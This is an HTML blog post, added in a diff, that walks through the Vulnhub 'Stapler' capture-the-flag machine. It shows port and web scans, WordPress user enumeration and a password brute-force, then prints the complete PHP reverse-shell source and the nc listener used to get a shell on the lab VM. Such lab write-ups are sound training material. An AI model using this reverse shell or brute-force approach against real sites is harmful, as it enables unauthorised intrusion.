@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!">
+    <meta name="author" content="W3ndige">
+    <title>Vulnhub.com - Stapler - Root Network Security</title>
+
+    <link rel="canonical" href="http://localhost:4000/2016/09/15/vulnhub-stapler/">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.png">
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/clean-blog.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="//https://fonts.googleapis.com/css?family=Nunito:400,700i" rel="stylesheet">
+    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Root Network Security" />
+
+</head>
+
+
+<body>
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Root Network Security</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav navbar-right">
+                <li>
+                    <a href="/about/">About</a>
+                </li>
+
+                <li>
+                    <a href="/archive/">Archive</a>
+                </li>
+
+                <li>
+                    <a href="/contact/">Contact</a>
+                </li>
+
+                <li>
+                    <a href="/projects/">Projects</a>
+                </li>
+
+                <li>
+                    <a href="/resources/">Resources</a>
+                </li>
+            </ul>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+
+
+    <!-- Post Header -->
+<header class="intro-header" style="background-image: url('/img/stapler-header.jpeg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <h1>Vulnhub.com - Stapler</h1>
+                    
+                    <h2 class="subheading">Write-Up</h2>
+                    
+                    <span class="meta">Posted by W3ndige on September 15, 2016</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+
+				<h1>Introduction</h1>
+
+<p>Todays challenge is going to be more security concerned as we're going to give a try boot2root machine from Vulnhub called Stapler. It's aimed for begining/intermediate pentesters, with goal to get root access. Let's jump straight into the content! </p>
+
+<p><a href="https://www.vulnhub.com/entry/stapler-1,150/" title="Stapler">Stapler</a><br /></p>
+
+<h1>Write-Up</h1>
+
+<p>Firstly let's discover IP address of our vulnerable machine. We can use nmap with quick scan options. For me result was <b>10.0.2.7</b> with some open ports but better option would be to perform full intense scan to look for any hidden ports. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -T4 -F 10.0.2.0/24</code></pre></figure>
+
+<p>And yeah, now we can see that port <b>12380</b> is hiding some web content. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>nmap -p 1-65535 -T5 -A -v 10.0.2.7
+
+Starting Nmap 7.25BETA1 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2016-09-11 03:52 EDT
+NSE: Loaded 138 scripts <span class="k">for </span>scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 03:52
+Completed NSE at 03:52, 0.00s elapsed
+Initiating NSE at 03:52
+Completed NSE at 03:52, 0.00s elapsed
+Initiating ARP Ping Scan at 03:52
+Scanning 10.0.2.7 <span class="o">[</span>1 port]
+Completed ARP Ping Scan at 03:52, 0.00s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Initiating SYN Stealth Scan at 03:52
+Scanning 10.0.2.7 <span class="o">[</span>65535 ports]
+Discovered open port 139/tcp on 10.0.2.7
+Discovered open port 53/tcp on 10.0.2.7
+Discovered open port 21/tcp on 10.0.2.7
+Discovered open port 80/tcp on 10.0.2.7
+Discovered open port 3306/tcp on 10.0.2.7
+Discovered open port 22/tcp on 10.0.2.7
+SYN Stealth Scan Timing: About 45.84% <span class="k">done</span>; ETC: 03:53 <span class="o">(</span>0:00:37 remaining<span class="o">)</span>
+Discovered open port 666/tcp on 10.0.2.7
+Discovered open port 12380/tcp on 10.0.2.7
+Completed SYN Stealth Scan at 03:53, 54.91s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Initiating Service scan at 03:53
+Scanning 8 services on 10.0.2.7
+Completed Service scan at 03:53, 18.62s elapsed <span class="o">(</span>8 services on 1 host<span class="o">)</span>
+Initiating OS detection <span class="o">(</span>try <span class="c">#1) against 10.0.2.7</span>
+NSE: Script scanning 10.0.2.7.
+Initiating NSE at 03:53
+NSE: <span class="o">[</span>ftp-bounce] Couldnt resolve scanme.nmap.org, scanning 10.0.0.1 instead.
+Completed NSE at 03:55, 129.02s elapsed
+Initiating NSE at 03:55
+Completed NSE at 03:55, 1.03s elapsed
+Nmap scan report <span class="k">for </span>10.0.2.7
+Host is up <span class="o">(</span>0.00075s latency<span class="o">)</span>.
+Not shown: 65523 filtered ports
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_Can<span class="s1">'t get directory listing: Can'</span>t parse PASV response: <span class="s2">"Permission denied."</span>
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 <span class="o">(</span>Ubuntu Linux; protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span class="o">(</span>RSA<span class="o">)</span>
+|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span class="o">(</span>ECDSA<span class="o">)</span>
+53/tcp    open   domain      dnsmasq 2.75
+| dns-nsid:
+|_  bind.version: dnsmasq-2.75
+80/tcp    open   http
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+666/tcp   open   doom?
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+|_mysql-info: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
+12380/tcp open   http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Tim, we need to-do better next year <span class="k">for </span>Initech
+MAC Address: 08:00:27:63:08:6F <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Uptime guess: 0.002 days <span class="o">(</span>since Sun Sep 11 03:53:05 2016<span class="o">)</span>
+Network Distance: 1 hop
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
+| Names:
+|   RED&lt;00&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   RED&lt;03&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   RED&lt;20&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery:
+|   OS: Windows 6.1 <span class="o">(</span>Samba 4.3.9-Ubuntu<span class="o">)</span>
+|   Computer name: red
+|   NetBIOS computer name: RED
+|   Domain name:
+|   FQDN: red
+|_  System <span class="nb">time</span>: 2016-09-11T10:53:32+01:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.75 ms 10.0.2.7
+
+NSE: Script Post-scanning.
+Initiating NSE at 03:55
+Completed NSE at 03:55, 0.00s elapsed
+Initiating NSE at 03:55
+Completed NSE at 03:55, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>206.61 seconds
+           Raw packets sent: 131126 <span class="o">(</span>5.771MB<span class="o">)</span> | Rcvd: 64 <span class="o">(</span>3.056KB<span class="o">)</span></code></pre></figure>
+
+<p>By running <b>nikto</b> on <b>10.0.2.7:12380</b>, we get few useful hints: that <b>robots.txt</b> is hiding 2 entries <b>/admin112233/</b> and <b>/blogblog/</b>. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">root@kali:~# </span>nikto -host 10.0.2.7:12380
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.7
++ Target Hostname:    10.0.2.7
++ Target Port:        12380
+---------------------------------------------------------------------------
++ SSL Info:        Subject:  /C<span class="o">=</span>UK/ST<span class="o">=</span>Somewhere <span class="k">in </span>the middle of nowhere/L<span class="o">=</span>Really, what are you meant to put here?/O<span class="o">=</span>Initech/OU<span class="o">=</span>Pam: I give up. no idea what to put here./CN<span class="o">=</span>Red.Initech/emailAddress<span class="o">=</span>pam@red.localhost
+                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
+                   Issuer:   /C<span class="o">=</span>UK/ST<span class="o">=</span>Somewhere <span class="k">in </span>the middle of nowhere/L<span class="o">=</span>Really, what are you meant to put here?/O<span class="o">=</span>Initech/OU<span class="o">=</span>Pam: I give up. no idea what to put here./CN<span class="o">=</span>Red.Initech/emailAddress<span class="o">=</span>pam@red.localhost
++ Start Time:         2016-09-11 04:02:21 <span class="o">(</span>GMT-4<span class="o">)</span>
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header <span class="s1">'dave'</span> found, with contents: Soemthing doesnt look right here
++ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Entry <span class="s1">'/admin112233/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
++ Entry <span class="s1">'/blogblog/'</span> <span class="k">in </span>robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
++ <span class="s2">"robots.txt"</span> contains 2 entries which should be manually viewed.
++ Hostname <span class="s1">'10.0.2.7'</span> does not match certificates names: Red.Initech
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
++ Uncommon header <span class="s1">'x-ob_mode'</span> found, with contents: 1
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 7690 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 14 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2016-09-11 04:04:44 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span>143 seconds<span class="o">)</span>
+---------------------------------------------------------------------------
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested</code></pre></figure>
+
+<p>After visiting <b>https://10.0.2.7:12380/admin112233/</b> we get this message ;) </p>
+<p><img src="/img/stapler/beef_hook.png" alt="beef_hook" class="img-responsive" /></p>
+
+<p>What about <b>/blogblog/</b> ? It seems as a blog of company called Initech based on Wordpress. </p>
+
+<p><img src="/img/stapler/initech.png" alt="initech" class="img-responsive" /></p>
+
+<p>But how can we attack this site? I thought about trying to enumerate the users, brute force the wp-admin page and then see what we can do. Let's start! </p>
+
+<p>Firstly let's try to enumerate any users using wpscan. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wpscan -u https://10.0.2.7:12380/blogblog/ --enumerate u
+
+    <span class="o">[</span>+] Enumerating usernames ...
+    <span class="o">[</span>+] Identified the following 10 user/s:
+        +----+---------+-----------------+
+        | Id | Login   | Name            |
+        +----+---------+-----------------+
+        | 1  | john    | John Smith      |
+        | 2  | elly    | Elly Jones      |
+        | 3  | peter   | Peter Parker    |
+        | 4  | barry   | Barry Atkins    |
+        | 5  | heather | Heather Neville |
+        | 6  | garry   | garry           |
+        | 7  | harry   | harry           |
+        | 8  | scott   | scott           |
+        | 9  | kathy   | kathy           |
+        | 10 | tim     | tim             |
+        +----+---------+-----------------+</code></pre></figure>
+
+<p>Now let's brute force the John account. Maybe we'll find something useful? </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wpscan --url https://10.0.2.5:12380/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john
+
++----+-------+------+----------+
+ | Id | Login | Name | Password |
+ +----+-------+------+----------+
+ |    | john  |      | incorrect|
+ +----+-------+------+----------+</code></pre></figure>
+
+<p>Here we go! Password for <b>john</b> is <b>incorrect</b>. Quite ironical, right? ;)</p>
+
+<p><img src="/img/stapler/login.png" alt="login" class="img-responsive" /></p>
+
+<p>After logging in we can try our luck with <b>php reverse shell</b>. By uploading the php file, setting up a listener and viewing the file we will be able to get the shell.  But firstly let's modify our rever shell script so it will work in this situation. </p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+</span>
+<span class="nb">set_time_limit</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nv">$VERSION</span> <span class="o">=</span> <span class="s2">"1.0"</span><span class="p">;</span>
+<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.0.2.7'</span><span class="p">;</span>  <span class="c1">// CHANGE THIS
+</span><span class="nv">$port</span> <span class="o">=</span> <span class="mi">1234</span><span class="p">;</span>       <span class="c1">// CHANGE THIS
+</span><span class="nv">$chunk_size</span> <span class="o">=</span> <span class="mi">1400</span><span class="p">;</span>
+<span class="nv">$write_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$error_a</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+<span class="nv">$shell</span> <span class="o">=</span> <span class="s1">'uname -a; w; id; /bin/sh -i'</span><span class="p">;</span>
+<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+<span class="c1">//
+// Daemonise ourself if possible to avoid zombies later
+//
+</span>
+<span class="c1">// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+</span><span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">'pcntl_fork'</span><span class="p">))</span> <span class="p">{</span>
+	<span class="c1">// Fork and have the parent process exit
+</span>	<span class="nv">$pid</span> <span class="o">=</span> <span class="nb">pcntl_fork</span><span class="p">();</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't fork"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$pid</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>  <span class="c1">// Parent exits
+</span>	<span class="p">}</span>
+
+	<span class="c1">// Make the current process a session leader
+</span>	<span class="c1">// Will only succeed if we forked
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">posix_setsid</span><span class="p">()</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"Error: Can't setsid()"</span><span class="p">);</span>
+		<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="nv">$daemon</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"WARNING: Failed to daemonise.  This is quite common and not fatal."</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Change to a safe directory
+</span><span class="nb">chdir</span><span class="p">(</span><span class="s2">"/"</span><span class="p">);</span>
+
+<span class="c1">// Remove any umask we inherited
+</span><span class="nb">umask</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+<span class="c1">//
+// Do the reverse shell...
+//
+</span>
+<span class="c1">// Open reverse connection
+</span><span class="nv">$sock</span> <span class="o">=</span> <span class="nb">fsockopen</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">30</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"</span><span class="nv">$errstr</span><span class="s2"> (</span><span class="nv">$errno</span><span class="s2">)"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Spawn shell process
+</span><span class="nv">$descriptorspec</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+   <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">),</span>  <span class="c1">// stdin is a pipe that the child will read from
+</span>   <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">),</span>  <span class="c1">// stdout is a pipe that the child will write to
+</span>   <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">"pipe"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>   <span class="c1">// stderr is a pipe that the child will write to
+</span><span class="p">);</span>
+
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="nv">$shell</span><span class="p">,</span> <span class="nv">$descriptorspec</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+	<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Can't spawn shell"</span><span class="p">);</span>
+	<span class="k">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+</span><span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
+<span class="nb">stream_set_blocking</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="nx">printit</span><span class="p">(</span><span class="s2">"Successfully opened reverse shell to </span><span class="nv">$ip</span><span class="s2">:</span><span class="nv">$port</span><span class="s2">"</span><span class="p">);</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+	<span class="c1">// Check for end of TCP connection
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$sock</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell connection terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Check for end of STDOUT
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
+		<span class="nx">printit</span><span class="p">(</span><span class="s2">"ERROR: Shell process terminated"</span><span class="p">);</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">// Wait until a command is end down $sock, or some
+</span>	<span class="c1">// command output is available on STDOUT or STDERR
+</span>	<span class="nv">$read_a</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+	<span class="nv">$num_changed_sockets</span> <span class="o">=</span> <span class="nb">stream_select</span><span class="p">(</span><span class="nv">$read_a</span><span class="p">,</span> <span class="nv">$write_a</span><span class="p">,</span> <span class="nv">$error_a</span><span class="p">,</span> <span class="kc">null</span><span class="p">);</span>
+
+	<span class="c1">// If we can read from the TCP socket, send
+</span>	<span class="c1">// data to process's STDIN
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"SOCK READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"SOCK: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDOUT
+</span>	<span class="c1">// send data down tcp connection
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDOUT READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDOUT: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="c1">// If we can read from the process's STDERR
+</span>	<span class="c1">// send data down tcp connection
+</span>	<span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$read_a</span><span class="p">))</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDERR READ"</span><span class="p">);</span>
+		<span class="nv">$input</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nv">$chunk_size</span><span class="p">);</span>
+		<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="nx">printit</span><span class="p">(</span><span class="s2">"STDERR: </span><span class="nv">$input</span><span class="s2">"</span><span class="p">);</span>
+		<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+<span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+<span class="c1">// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+</span><span class="k">function</span> <span class="nf">printit</span> <span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$daemon</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">print</span> <span class="s2">"</span><span class="nv">$string</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span></code></pre></figure>
+
+<p>Then let's move into uploading the file into the the plugins section. Notice that it will not actually upload as a plugin but Wordpress will move the php file into the media section. </p>
+
+<p><img src="/img/stapler/php-reverse-1.png" alt="php-reverse-1" class="img-responsive" /></p>
+
+<p>Now by viewing the file it will show us URL. Now it's time to set up our listener. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -lvp 1234</code></pre></figure>
+
+<p>Remember to enter the port same as you entered while configurationg the php revere shell - in my version <b>1234</b>. </p>
+
+<p><img src="/img/stapler/php-reverse-2.png" alt="php-reverse-2" class="img-responsive" /></p>
+
+<p>Now let's enter the URL which will start reverse shell. </p>
+
+<p><img src="/img/stapler/php-reverse-3.png" alt="php-reverse-3" class="img-responsive" /></p>
+
